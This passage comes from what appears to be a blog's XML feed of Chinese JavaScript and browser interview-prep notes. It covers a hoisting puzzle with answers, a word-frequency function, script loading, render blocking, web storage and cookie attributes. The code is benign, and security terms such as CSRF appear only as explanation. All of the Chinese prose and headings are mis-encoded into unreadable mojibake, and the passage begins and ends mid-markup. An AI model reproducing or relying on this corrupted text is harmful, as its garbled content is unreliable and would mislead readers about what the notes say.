class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä¸€é“å¸¸è¢«äººè½»è§†çš„å‰ç«¯-JS-é¢è¯•é¢˜"><a href="#ä¸€é“å¸¸è¢«äººè½»è§†çš„å‰ç«¯-JS-é¢è¯•é¢˜" class="headerlink" title="ä¸€é“å¸¸è¢«äººè½»è§†çš„å‰ç«¯ JS é¢è¯•é¢˜"></a>ä¸€é“å¸¸è¢«äººè½»è§†çš„å‰ç«¯ JS é¢è¯•é¢˜</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">Foo.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="number">2</span>);</span><br><span class="line">&#125;;</span><br><span class="line">Foo.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="number">3</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="number">4</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¯·å†™å‡ºä»¥ä¸‹è¾“å‡ºç»“æœï¼š</span></span><br><span class="line">Foo.getName(); <span class="comment">// 2</span></span><br><span class="line">getName(); <span class="comment">// 4</span></span><br><span class="line">Foo().getName(); <span class="comment">// 1</span></span><br><span class="line">getName(); <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">new</span> Foo.getName(); <span class="comment">// 2</span></span><br><span class="line"><span class="keyword">new</span> Foo().getName(); <span class="comment">// 3</span></span><br><span class="line"><span class="keyword">new</span> <span class="keyword">new</span> Foo().getName(); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><h2 id="å¦‚ä½•æŸ¥æ‰¾ä¸€ç¯‡è‹±æ–‡æ–‡ç« ä¸­å‡ºç°é¢‘ç‡æœ€é«˜çš„å•è¯ï¼Ÿ"><a href="#å¦‚ä½•æŸ¥æ‰¾ä¸€ç¯‡è‹±æ–‡æ–‡ç« ä¸­å‡ºç°é¢‘ç‡æœ€é«˜çš„å•è¯ï¼Ÿ" class="headerlink" title="å¦‚ä½•æŸ¥æ‰¾ä¸€ç¯‡è‹±æ–‡æ–‡ç« ä¸­å‡ºç°é¢‘ç‡æœ€é«˜çš„å•è¯ï¼Ÿ"></a>å¦‚ä½•æŸ¥æ‰¾ä¸€ç¯‡è‹±æ–‡æ–‡ç« ä¸­å‡ºç°é¢‘ç‡æœ€é«˜çš„å•è¯ï¼Ÿ</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findMostWord</span>(<span class="params">article</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// åˆæ³•æ€§åˆ¤æ–­</span></span><br><span class="line">  <span class="keyword">if</span> (!article) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å‚æ•°å¤„ç†</span></span><br><span class="line">  article = article.trim().toLowerCase();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> wordList = article.match(<span class="regexp">/[a-z]+/g</span>),</span><br><span class="line">    visited = [],</span><br><span class="line">    maxNum = <span class="number">0</span>,</span><br><span class="line">    maxWord = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  article = <span class="string">&quot; &quot;</span> + wordList.join(<span class="string">&quot;  &quot;</span>) + <span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// éå†åˆ¤æ–­å•è¯å‡ºç°æ¬¡æ•°</span></span><br><span class="line">  wordList.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (visited.indexOf(item) &lt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// åŠ å…¥ visited </span></span><br><span class="line">      visited.push(item);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> word = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&quot; &quot;</span> + item + <span class="string">&quot; &quot;</span>, <span class="string">&quot;g&quot;</span>),</span><br><span class="line">        num = article.match(word).length;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (num &gt; maxNum) &#123;</span><br><span class="line">        maxNum = num;</span><br><span class="line">        maxWord = item;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> maxWord + <span class="string">&quot;  &quot;</span> + maxNum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¤§æ•°ç›¸åŠ "><a href="#å¤§æ•°ç›¸åŠ " class="headerlink" title="å¤§æ•°ç›¸åŠ "></a>å¤§æ•°ç›¸åŠ </h2><p>å‚è€ƒè‡ª<a href="https://zhuanlan.zhihu.com/p/72179476">JS å®ç°ä¸¤ä¸ªå¤§æ•°ç›¸åŠ ï¼Ÿ</a>ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æœ¬æ–‡æ˜¯æˆ‘åœ¨å¤ä¹ JavaScriptï¼Œå‡†å¤‡å®ä¹ é¢è¯•æ—¶æ•´ç†çš„ç¬”è®°ï¼Œä¸»è¦å‚è€ƒè‡ªå‘¨æ¸¸å­¦é•¿çš„åšå®¢ï¼š&lt;a href=&quot;https://github.co</summary>
      
    
    
    
    <category term="é¢è¯•å‡†å¤‡" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"/>
    
    
    <category term="JavaScript" scheme="http://example.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>ã€é¢è¯•å‡†å¤‡ã€‘â€” â€” æµè§ˆå™¨å·¥ä½œåŸç†ç¯‡</title>
    <link href="http://example.com/2021/06/30/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E7%AF%87/"/>
    <id>http://example.com/2021/06/30/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E7%AF%87/</id>
    <published>2021-06-30T20:55:18.000Z</published>
    <updated>2021-09-11T08:58:44.869Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ¬æ–‡æ˜¯æˆ‘åœ¨å¤ä¹ æµè§ˆå™¨ç›¸å…³çŸ¥è¯†ï¼Œå‡†å¤‡å®ä¹ é¢è¯•æ—¶æ•´ç†çš„ç¬”è®°ï¼Œå‚è€ƒè‡ªä¸€äº›å·²ç»æ•´ç†å¥½çš„åšå®¢ï¼š<a href="https://juejin.cn/post/6854573215830933512">ã€ŒæŸ¥ç¼ºè¡¥æ¼ã€é€ä½ 18é“æµè§ˆå™¨é¢è¯•é¢˜</a>ï¼Œä¾µæƒåˆ ã€‚</p><h1 id="1-å¸¸è§çš„æµè§ˆå™¨å†…æ ¸æœ‰å“ªäº›"><a href="#1-å¸¸è§çš„æµè§ˆå™¨å†…æ ¸æœ‰å“ªäº›" class="headerlink" title="1. å¸¸è§çš„æµè§ˆå™¨å†…æ ¸æœ‰å“ªäº›?"></a>1. å¸¸è§çš„æµè§ˆå™¨å†…æ ¸æœ‰å“ªäº›?</h1><table><thead><tr><th>æµè§ˆå™¨/RunTime</th><th>å†…æ ¸ï¼ˆæ¸²æŸ“å¼•æ“ï¼‰</th><th>JavaScript å¼•æ“</th></tr></thead><tbody><tr><td>Chrome</td><td>webkit-&gt;blink</td><td>V8</td></tr><tr><td>FireFox</td><td>Gecko</td><td>SpiderMonkey</td></tr><tr><td>Safari</td><td>Webkit</td><td>JavaScriptCore</td></tr><tr><td>Edge</td><td>EdgeHTML</td><td>Chakra(for JavaScript)</td></tr><tr><td>IE</td><td>Trident</td><td>JScriptï¼ˆIE3.0-IE8.0ï¼‰</td></tr><tr><td>Opera</td><td>Presto-&gt;blink</td><td>Linear Aï¼ˆ4.0-6.1ï¼‰/ Linear Bï¼ˆ7.0-9.2ï¼‰/ Futharkï¼ˆ9.5-10.2ï¼‰/ Carakanï¼ˆ10.5-ï¼‰</td></tr><tr><td>Node.js</td><td>-</td><td>V8</td></tr></tbody></table><p>æµè§ˆå™¨çš„å†…æ ¸å¼•æ“ï¼ŒåŸºæœ¬ä¸Šæ˜¯å››åˆ†å¤©ä¸‹ï¼š</p><ul><li>Trident: IE ä»¥Trident ä½œä¸ºå†…æ ¸å¼•æ“ï¼›</li><li>Gecko: Firefox æ˜¯åŸºäº Gecko å¼€å‘ï¼›</li><li>WebKit: Safari, Google Chrome,å‚²æ¸¸3,çŒè±¹æµè§ˆå™¨,ç™¾åº¦æµè§ˆå™¨ operaæµè§ˆå™¨ï¼›</li><li>Presto: Operaçš„å†…æ ¸ï¼Œä½†ç”±äºå¸‚åœºé€‰æ‹©é—®é¢˜ï¼Œä¸»è¦åº”ç”¨åœ¨æ‰‹æœºå¹³å°â€“Opera miniã€‚</li></ul><h1 id="2-æµè§ˆå™¨çš„ä¸»è¦ç»„æˆéƒ¨åˆ†æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#2-æµè§ˆå™¨çš„ä¸»è¦ç»„æˆéƒ¨åˆ†æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="2. æµè§ˆå™¨çš„ä¸»è¦ç»„æˆéƒ¨åˆ†æ˜¯ä»€ä¹ˆï¼Ÿ"></a>2. æµè§ˆå™¨çš„ä¸»è¦ç»„æˆéƒ¨åˆ†æ˜¯ä»€ä¹ˆï¼Ÿ</h1><ol><li><strong>ã€Œç”¨æˆ·ç•Œé¢ã€</strong> - åŒ…æ‹¬åœ°å€æ ã€å‰è¿›/åé€€æŒ‰é’®ã€ä¹¦ç­¾èœå•ç­‰ã€‚</li><li><strong>ã€Œæµè§ˆå™¨å¼•æ“ã€</strong> - åœ¨ç”¨æˆ·ç•Œé¢å’Œå‘ˆç°å¼•æ“ä¹‹é—´ä¼ é€æŒ‡ä»¤ã€‚</li><li><strong>ã€Œå‘ˆç°å¼•æ“ã€</strong> - è´Ÿè´£æ˜¾ç¤ºè¯·æ±‚çš„å†…å®¹ã€‚å¦‚æœè¯·æ±‚çš„å†…å®¹æ˜¯ HTMLï¼Œå®ƒå°±è´Ÿè´£è§£æ HTML å’Œ CSS å†…å®¹ï¼Œå¹¶å°†è§£æåçš„å†…å®¹æ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚</li><li><strong>ã€Œç½‘ç»œã€</strong> - ç”¨äºç½‘ç»œè°ƒç”¨ï¼Œæ¯”å¦‚ HTTP è¯·æ±‚ã€‚</li><li><strong>ã€Œç”¨æˆ·ç•Œé¢åç«¯ã€</strong> -ç”¨äºç»˜åˆ¶åŸºæœ¬çš„çª—å£å°éƒ¨ä»¶ï¼Œæ¯”å¦‚ç»„åˆæ¡†å’Œçª—å£ã€‚</li><li><strong>ã€ŒJavaScript è§£é‡Šå™¨ã€</strong>- ç”¨äºè§£æå’Œæ‰§è¡Œ JavaScript ä»£ç ã€‚</li><li><strong>ã€Œæ•°æ®å­˜å‚¨ã€</strong> - è¿™æ˜¯æŒä¹…å±‚ã€‚æµè§ˆå™¨éœ€è¦åœ¨ç¡¬ç›˜ä¸Šä¿å­˜å„ç§æ•°æ®ï¼Œä¾‹å¦‚ Cookieã€‚æ–°çš„ HTML è§„èŒƒ (HTML5) å®šä¹‰äº†â€œç½‘ç»œæ•°æ®åº“â€ï¼Œè¿™æ˜¯ä¸€ä¸ªå®Œæ•´ï¼ˆä½†æ˜¯è½»ä¾¿ï¼‰çš„æµè§ˆå™¨å†…æ•°æ®åº“ã€‚</li></ol><p>æ³¨æ„ï¼Œå’Œå¤§å¤šæ•°æµè§ˆå™¨ä¸åŒï¼ŒChrome æµè§ˆå™¨çš„æ¯ä¸ªæ ‡ç­¾é¡µéƒ½åˆ†åˆ«å¯¹åº”ä¸€ä¸ªå‘ˆç°å¼•æ“å®ä¾‹ã€‚æ¯ä¸ªæ ‡ç­¾é¡µéƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹ã€‚</p><h1 id="3-ä¸ºä»€ä¹ˆJavaScriptæ˜¯å•çº¿ç¨‹çš„ï¼Œä¸å¼‚æ­¥å†²çªå—"><a href="#3-ä¸ºä»€ä¹ˆJavaScriptæ˜¯å•çº¿ç¨‹çš„ï¼Œä¸å¼‚æ­¥å†²çªå—" class="headerlink" title="3. ä¸ºä»€ä¹ˆJavaScriptæ˜¯å•çº¿ç¨‹çš„ï¼Œä¸å¼‚æ­¥å†²çªå—"></a>3. ä¸ºä»€ä¹ˆJavaScriptæ˜¯å•çº¿ç¨‹çš„ï¼Œä¸å¼‚æ­¥å†²çªå—</h1><p>JSçš„å•çº¿ç¨‹æ˜¯æŒ‡ä¸€ä¸ªæµè§ˆå™¨è¿›ç¨‹ä¸­åªæœ‰ä¸€ä¸ªJSçš„æ‰§è¡Œçº¿ç¨‹ï¼ŒåŒä¸€æ—¶åˆ»å†…åªä¼šæœ‰ä¸€æ®µä»£ç åœ¨æ‰§è¡Œã€‚</p><p>å¼‚æ­¥æœºåˆ¶æ˜¯æµè§ˆå™¨çš„ä¸¤ä¸ªæˆ–ä»¥ä¸Šå¸¸é©»çº¿ç¨‹å…±åŒå®Œæˆçš„ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚å¼‚æ­¥è¯·æ±‚ç”±ä¸¤ä¸ªå¸¸é©»çº¿ç¨‹ï¼ŒJSæ‰§è¡Œçº¿ç¨‹å’Œäº‹ä»¶è§¦å‘çº¿ç¨‹å…±åŒå®Œæˆçš„ã€‚</p><ul><li>JSæ‰§è¡Œçº¿ç¨‹å‘èµ·å¼‚æ­¥è¯·æ±‚ï¼ˆæµè§ˆå™¨ä¼šå¼€å¯ä¸€ä¸ªHTTPè¯·æ±‚çº¿ç¨‹æ¥æ‰§è¡Œè¯·æ±‚ï¼Œè¿™æ—¶JSçš„ä»»åŠ¡å®Œæˆï¼Œç»§ç»­æ‰§è¡Œçº¿ç¨‹é˜Ÿåˆ—ä¸­å‰©ä¸‹ä»»åŠ¡ï¼‰</li><li>ç„¶ååœ¨æœªæ¥çš„æŸä¸€æ—¶åˆ»äº‹ä»¶è§¦å‘çº¿ç¨‹ç›‘è§†åˆ°ä¹‹å‰çš„å‘èµ·çš„HTTPè¯·æ±‚å·²å®Œæˆï¼Œå®ƒå°±ä¼šæŠŠå®Œæˆäº‹ä»¶æ’å…¥åˆ°JSæ‰§è¡Œé˜Ÿåˆ—çš„å°¾éƒ¨ç­‰å¾…JSå¤„ç†</li></ul><p>å†æ¯”å¦‚å®šæ—¶å™¨è§¦å‘(settimeoutå’Œsetinterval) æ˜¯ç”±<strong>ã€Œæµè§ˆå™¨çš„å®šæ—¶å™¨çº¿ç¨‹ã€</strong>æ‰§è¡Œçš„å®šæ—¶è®¡æ•°ï¼Œç„¶ååœ¨å®šæ—¶æ—¶é—´æŠŠå®šæ—¶å¤„ç†å‡½æ•°çš„æ‰§è¡Œè¯·æ±‚æ’å…¥åˆ°JSæ‰§è¡Œé˜Ÿåˆ—çš„å°¾ç«¯ï¼ˆæ‰€ä»¥ç”¨è¿™ä¸¤ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œå®é™…çš„æ‰§è¡Œæ—¶é—´æ˜¯å¤§äºæˆ–ç­‰äºæŒ‡å®šæ—¶é—´çš„ï¼Œä¸ä¿è¯èƒ½å‡†ç¡®å®šæ—¶çš„ï¼‰ã€‚</p><p>æ‰€ä»¥è¿™ä¹ˆè¯´ï¼ŒJSå•çº¿ç¨‹ä¸å¼‚æ­¥æ›´å¤šæ˜¯æµè§ˆå™¨è¡Œä¸ºï¼Œä¹‹é—´ä¸å†²çªã€‚</p><h1 id="ä»€ä¹ˆæƒ…å†µé˜»å¡æ¸²æŸ“ï¼Ÿ"><a href="#ä»€ä¹ˆæƒ…å†µé˜»å¡æ¸²æŸ“ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæƒ…å†µé˜»å¡æ¸²æŸ“ï¼Ÿ"></a>ä»€ä¹ˆæƒ…å†µé˜»å¡æ¸²æŸ“ï¼Ÿ</h1><h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><ul><li><p><code>CSS</code>ä¸ä¼šé˜»å¡<code>DOM</code>è§£æï¼Œä½†ä¼šé˜»å¡<code>DOM</code>æ¸²æŸ“ã€‚</p><p>å› ä¸ºDOM å’Œ CSSOMé€šå¸¸æ˜¯å¹¶è¡Œæ„å»ºçš„ï¼Œä½†Render Tree æ˜¯ä¾èµ–DOM Treeå’Œ CSSOM Treeçš„ï¼Œæ‰€ä»¥å®ƒå¿…é¡»ç­‰åˆ°ä¸¤è€…éƒ½åŠ è½½å®Œæ¯•åï¼Œå®Œæˆç›¸åº”çš„æ„å»ºï¼Œæ‰å¼€å§‹æ¸²æŸ“ã€‚</p></li><li><p><code>CSS</code>ä¼šé˜»å¡JSæ‰§è¡Œï¼Œå¹¶ä¸ä¼šé˜»å¡JSæ–‡ä»¶ä¸‹è½½</p><p>å› ä¸ºå¦‚æœè„šæœ¬çš„å†…å®¹æ˜¯è·å–å…ƒç´ çš„æ ·å¼ï¼Œå®½é«˜ç­‰<code>CSS</code>æ§åˆ¶çš„å±æ€§ï¼Œæµè§ˆå™¨æ˜¯éœ€è¦è®¡ç®—çš„ï¼Œä¹Ÿå°±æ˜¯ä¾èµ–äº<code>CSS</code>ã€‚æµè§ˆå™¨ä¹Ÿæ— æ³•æ„ŸçŸ¥è„šæœ¬å†…å®¹åˆ°åº•æ˜¯ä»€ä¹ˆï¼Œä¸ºé¿å…æ ·å¼è·å–ï¼Œå› è€Œåªå¥½ç­‰å‰é¢æ‰€æœ‰çš„æ ·å¼ä¸‹è½½å®Œåï¼Œå†æ‰§è¡Œ<code>JS</code>ã€‚JSæ–‡ä»¶ä¸‹è½½å’ŒCSSæ–‡ä»¶ä¸‹è½½æ˜¯å¹¶è¡Œçš„ï¼Œæœ‰æ—¶å€™CSSæ–‡ä»¶å¾ˆå¤§ï¼Œæ‰€ä»¥JSéœ€è¦ç­‰å¾…ã€‚</p></li></ul><h2 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h2><p>ç”±äº JavaScript æ˜¯å¯æ“çºµ DOM çš„,å¦‚æœåœ¨ä¿®æ”¹è¿™äº›å…ƒç´ å±æ€§åŒæ—¶æ¸²æŸ“ç•Œé¢ï¼ˆå³ JavaScript çº¿ç¨‹å’Œ UI çº¿ç¨‹åŒæ—¶è¿è¡Œï¼‰,é‚£ä¹ˆæ¸²æŸ“çº¿ç¨‹å‰åè·å¾—çš„å…ƒç´ æ•°æ®å°±å¯èƒ½ä¸ä¸€è‡´äº†ã€‚</p><p>å› æ­¤ä¸ºäº†é˜²æ­¢æ¸²æŸ“å‡ºç°ä¸å¯é¢„æœŸçš„ç»“æœ,æµè§ˆå™¨è®¾ç½® <strong>ã€ŒGUI æ¸²æŸ“çº¿ç¨‹ä¸ JavaScript å¼•æ“ä¸ºäº’æ–¥ã€</strong>çš„å…³ç³»ã€‚</p><p>å½“ JavaScript å¼•æ“æ‰§è¡Œæ—¶ GUI çº¿ç¨‹ä¼šè¢«æŒ‚èµ·,GUI æ›´æ–°ä¼šè¢«ä¿å­˜åœ¨ä¸€ä¸ªé˜Ÿåˆ—ä¸­ç­‰åˆ°å¼•æ“çº¿ç¨‹ç©ºé—²æ—¶ç«‹å³è¢«æ‰§è¡Œã€‚</p><p>å½“æµè§ˆå™¨åœ¨æ‰§è¡Œ JavaScript ç¨‹åºçš„æ—¶å€™,GUI æ¸²æŸ“çº¿ç¨‹ä¼šè¢«ä¿å­˜åœ¨ä¸€ä¸ªé˜Ÿåˆ—ä¸­,ç›´åˆ° JS ç¨‹åºæ‰§è¡Œå®Œæˆ,æ‰ä¼šæ¥ç€æ‰§è¡Œã€‚</p><p>å› æ­¤å¦‚æœ JS æ‰§è¡Œçš„æ—¶é—´è¿‡é•¿,è¿™æ ·å°±ä¼šé€ æˆé¡µé¢çš„æ¸²æŸ“ä¸è¿è´¯,å¯¼è‡´é¡µé¢æ¸²æŸ“åŠ è½½é˜»å¡çš„æ„Ÿè§‰ã€‚</p><h1 id="6-defer-å’Œ-async-çš„åŒºåˆ«"><a href="#6-defer-å’Œ-async-çš„åŒºåˆ«" class="headerlink" title="6. defer å’Œ async çš„åŒºåˆ« ?"></a>6. defer å’Œ async çš„åŒºåˆ« ?</h1><ul><li>ä¸¤è€…éƒ½æ˜¯å¼‚æ­¥å»åŠ è½½å¤–éƒ¨JSæ–‡ä»¶ï¼Œä¸ä¼šé˜»å¡DOMè§£æ</li><li>Asyncæ˜¯åœ¨å¤–éƒ¨JSåŠ è½½å®Œæˆåï¼Œæµè§ˆå™¨ç©ºé—²æ—¶ï¼ŒLoadäº‹ä»¶è§¦å‘å‰æ‰§è¡Œï¼Œæ ‡è®°ä¸ºasyncçš„è„šæœ¬å¹¶ä¸ä¿è¯æŒ‰ç…§æŒ‡å®šä»–ä»¬çš„å…ˆåé¡ºåºæ‰§è¡Œï¼Œè¯¥å±æ€§å¯¹äºå†…è”è„šæœ¬æ— ä½œç”¨ (å³æ²¡æœ‰<strong>ã€Œsrcã€</strong>å±æ€§çš„è„šæœ¬ï¼‰ã€‚</li><li>deferæ˜¯åœ¨JSåŠ è½½å®Œæˆåï¼Œæ•´ä¸ªæ–‡æ¡£è§£æå®Œæˆåï¼Œè§¦å‘ <code>DOMContentLoaded</code> äº‹ä»¶å‰æ‰§è¡Œï¼Œå¦‚æœç¼ºå°‘ <code>src</code> å±æ€§ï¼ˆå³å†…åµŒè„šæœ¬ï¼‰ï¼Œè¯¥å±æ€§ä¸åº”è¢«ä½¿ç”¨ï¼Œå› ä¸ºè¿™ç§æƒ…å†µä¸‹å®ƒä¸èµ·ä½œç”¨</li></ul><h1 id="7-DOMContentLoaded-ä¸-load-çš„åŒºåˆ«"><a href="#7-DOMContentLoaded-ä¸-load-çš„åŒºåˆ«" class="headerlink" title="7. DOMContentLoaded ä¸ load çš„åŒºåˆ« ?"></a>7. DOMContentLoaded ä¸ load çš„åŒºåˆ« ?</h1><ul><li>DOMContentLoadedäº‹ä»¶è§¦å‘æ—¶ï¼šä»…å½“DOMè§£æå®Œæˆåï¼Œä¸åŒ…æ‹¬æ ·å¼è¡¨ï¼Œå›¾ç‰‡ç­‰èµ„æºã€‚</li><li>onload äº‹ä»¶è§¦å‘æ—¶,é¡µé¢ä¸Šæ‰€æœ‰çš„ DOM,æ ·å¼è¡¨,è„šæœ¬,å›¾ç‰‡ç­‰èµ„æºå·²ç»åŠ è½½å®Œæ¯•ã€‚</li></ul><h1 id="æœ‰å‡ ç§æ–¹å¼å¯ä»¥å®ç°å­˜å‚¨åŠŸèƒ½ï¼Œåˆ†åˆ«æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹ï¼Ÿ"><a href="#æœ‰å‡ ç§æ–¹å¼å¯ä»¥å®ç°å­˜å‚¨åŠŸèƒ½ï¼Œåˆ†åˆ«æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹ï¼Ÿ" class="headerlink" title="æœ‰å‡ ç§æ–¹å¼å¯ä»¥å®ç°å­˜å‚¨åŠŸèƒ½ï¼Œåˆ†åˆ«æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹ï¼Ÿ"></a>æœ‰å‡ ç§æ–¹å¼å¯ä»¥å®ç°å­˜å‚¨åŠŸèƒ½ï¼Œåˆ†åˆ«æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹ï¼Ÿ</h1><h2 id="cookieï¼ŒlocalStorageï¼ŒsessionStorageï¼ŒindexDB"><a href="#cookieï¼ŒlocalStorageï¼ŒsessionStorageï¼ŒindexDB" class="headerlink" title="cookieï¼ŒlocalStorageï¼ŒsessionStorageï¼ŒindexDB"></a>cookieï¼ŒlocalStorageï¼ŒsessionStorageï¼ŒindexDB</h2><p>![_Y_G2YI_S______R~NTP`F5.png](<a href="https://i.loli.net/2021/09/11/N49TzFGH8Y6CRvx.png">https://i.loli.net/2021/09/11/N49TzFGH8Y6CRvx.png</a>)</p><p>ä»ä¸Šè¡¨å¯ä»¥çœ‹åˆ°ï¼Œ<code>cookie</code> å·²ç»ä¸å»ºè®®ç”¨äºå­˜å‚¨ã€‚å¦‚æœæ²¡æœ‰å¤§é‡æ•°æ®å­˜å‚¨éœ€æ±‚çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨ <code>localStorage</code> å’Œ <code>sessionStorage</code> ã€‚å¯¹äºä¸æ€ä¹ˆæ”¹å˜çš„æ•°æ®å°½é‡ä½¿ç”¨ <code>localStorage</code> å­˜å‚¨ï¼Œå¦åˆ™å¯ä»¥ç”¨ <code>sessionStorage</code> å­˜å‚¨ã€‚</p><p>å¯¹äº <code>cookie</code> æ¥è¯´ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ³¨æ„å®‰å…¨æ€§ã€‚</p><p><img src="https://i.loli.net/2021/09/11/Uh1amdz9rvwJg4x.png" alt="image.png"></p><h1 id="ç®€å•è°ˆä¸€ä¸‹-cookie-ï¼Ÿ"><a href="#ç®€å•è°ˆä¸€ä¸‹-cookie-ï¼Ÿ" class="headerlink" title="ç®€å•è°ˆä¸€ä¸‹ cookie ï¼Ÿ"></a>ç®€å•è°ˆä¸€ä¸‹ cookie ï¼Ÿ</h1><p>æˆ‘çš„ç†è§£æ˜¯ cookie æ˜¯æœåŠ¡å™¨æä¾›çš„ä¸€ç§ç”¨äºç»´æŠ¤ä¼šè¯çŠ¶æ€ä¿¡æ¯çš„æ•°æ®ï¼Œé€šè¿‡æœåŠ¡å™¨å‘é€åˆ°æµè§ˆå™¨ï¼Œæµè§ˆå™¨ä¿å­˜åœ¨æœ¬åœ°ï¼Œå½“ä¸‹ä¸€æ¬¡æœ‰åŒæºçš„è¯·æ±‚æ—¶ï¼Œå°†ä¿å­˜çš„ cookie å€¼æ·»åŠ åˆ°è¯·æ±‚å¤´éƒ¨ï¼Œå‘é€ç»™æœåŠ¡ç«¯ã€‚è¿™å¯ä»¥ç”¨æ¥å®ç°è®°å½•ç”¨æˆ·ç™»å½•çŠ¶æ€ç­‰åŠŸèƒ½ã€‚cookie ä¸€èˆ¬å¯ä»¥å­˜å‚¨ 4k å¤§å°çš„æ•°æ®ï¼Œå¹¶ä¸”åªèƒ½å¤Ÿè¢«åŒæºçš„ç½‘é¡µæ‰€å…±äº«è®¿é—®ã€‚</p><p>æœåŠ¡å™¨ç«¯å¯ä»¥ä½¿ç”¨ Set-Cookie çš„å“åº”å¤´éƒ¨æ¥é…ç½® cookie ä¿¡æ¯ã€‚ä¸€æ¡cookie åŒ…æ‹¬äº†9ä¸ªå±æ€§å€¼ nameã€valueã€expiresã€domainã€pathã€secureã€HttpOnlyã€SameSiteã€Priorityã€‚å…¶ä¸­ name å’Œ value åˆ†åˆ«æ˜¯ cookie çš„åå­—å’Œå€¼ã€‚expires æŒ‡å®šäº† cookie å¤±æ•ˆçš„æ—¶é—´ï¼Œdomain æ˜¯åŸŸåã€pathæ˜¯è·¯å¾„ï¼Œdomain å’Œ path ä¸€èµ·é™åˆ¶äº† cookie èƒ½å¤Ÿè¢«å“ªäº› url è®¿é—®ã€‚secure è§„å®šäº† cookie åªèƒ½åœ¨ç¡®ä¿å®‰å…¨çš„æƒ…å†µä¸‹ä¼ è¾“ï¼ŒHttpOnly è§„å®šäº†è¿™ä¸ª cookie åªèƒ½è¢«æœåŠ¡å™¨è®¿é—®ï¼Œä¸èƒ½ä½¿ç”¨ js è„šæœ¬è®¿é—®ã€‚SameSite å±æ€§ç”¨æ¥é™åˆ¶ç¬¬ä¸‰æ–¹ cookieï¼Œå¯ä»¥æœ‰æ•ˆé˜²æ­¢ CSRF æ”»å‡»ï¼Œä»è€Œå‡å°‘å®‰å…¨é£é™©ã€‚Priority æ˜¯ chrome çš„ææ¡ˆï¼Œå®šä¹‰äº†ä¸‰ç§ä¼˜å…ˆçº§ï¼Œå½“ cookie æ•°é‡è¶…å‡ºæ—¶ä½ä¼˜å…ˆçº§çš„ cookie ä¼šè¢«ä¼˜å…ˆæ¸…é™¤ã€‚</p><p>åœ¨å‘ç”Ÿ xhr çš„è·¨åŸŸè¯·æ±‚çš„æ—¶å€™ï¼Œå³ä½¿æ˜¯åŒæºä¸‹çš„ 